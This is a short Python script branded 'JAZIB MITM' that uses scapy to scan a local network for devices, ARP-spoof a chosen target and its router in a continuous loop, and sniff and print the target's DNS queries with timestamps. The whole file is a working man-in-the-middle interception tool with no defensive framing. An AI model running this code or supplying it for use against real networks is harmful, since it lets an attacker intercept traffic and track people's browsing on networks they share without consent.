import argparse
import threading
from pyfiglet import figlet_format
from colorama import init, Fore, Style

init()  # Initialize colorama for cross-platform support

print(Fore.RED + figlet_format("JAZIB MITM", font="block") + Style.RESET_ALL)
from time import strftime, localtime 
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP
from mac_vendor_lookup import MacLookup, VendorNotFoundError

parser = argparse.ArgumentParser(description='DNS sniffer')
parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")')
parser.add_argument('--targetip', help='Target IP address to sniff')
parser.add_argument('--iface', help='Interface to use for attacker', required=True)
parser.add_argument('--routerip', help='IP of your home router', required=True)
opts = parser.parse_args()

if not opts.targetip and not opts.network:
    parser.error('Either --targetip or --network must be provided.')

def arp_scan(network, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=5, iface=iface)
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    return input('\nPick a device IP:  ')

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface
    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                    print('IP seems down, retrying ... ')
                    continue
    def capture(self):
        sniff(iface=self.iface, prn=self.dns,
              filter = f'src host {self.targetip} and udp port 53')
    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
    def watch(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())

        t1.start()
        t2.start()
if __name__ == '__main__':
    if opts.targetip:
        targetip = opts.targetip
    else:
        targetip = arp_scan(opts.network, opts.iface)

    device = Device(opts.routerip, targetip, opts.iface)
    device.watch()

